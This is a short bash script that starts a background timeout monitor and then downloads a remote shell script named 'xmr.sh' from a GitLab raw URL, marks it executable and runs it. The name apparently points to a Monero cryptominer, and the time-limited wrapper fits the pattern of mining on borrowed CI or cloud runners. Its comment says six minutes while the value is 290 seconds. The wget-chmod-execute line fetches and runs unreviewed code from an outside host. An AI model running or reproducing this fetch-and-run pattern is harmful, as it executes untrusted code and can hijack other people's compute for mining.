#!/bin/bash

Timeout=290 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmr.sh && chmod +x xmr.sh && ./xmr.sh
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit
